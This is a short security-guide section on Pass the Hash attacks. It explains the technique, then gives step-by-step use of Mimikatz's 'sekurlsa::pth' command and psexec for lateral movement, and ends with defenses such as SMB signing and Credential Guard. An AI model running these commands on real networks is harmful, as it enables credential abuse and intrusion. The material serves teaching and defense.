E.1 What It Is
	• Pass the Hash (PtH): Using an NTLM hash directly to authenticate to remote systems without cracking the password.
E.2 Why It Matters
	• Attackers with a single privileged NTLM hash can pivot to countless Windows hosts or services.
	• Common in “lateral movement” scenarios.
E.3 How to Exploit (Step-by-Step)
	1. Capture NTLM Hash
		○ Via Mimikatz, Responder, NTDS.dit, etc.
	2. Use Mimikatz

powershell
CopyEdit
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe
	3. Authenticate to Remote Host
		○ psexec \\remotehost cmd or dir \\remotehost\C$—the OS sees valid credentials because you’re using the hash.
	4. Defend
		○ Turn on SMB signing or Windows Defender Credential Guard.
		○ Enforce Privilege Access Workstations for domain admins.
		○ Limit local admin privileges to reduce PtH impact.
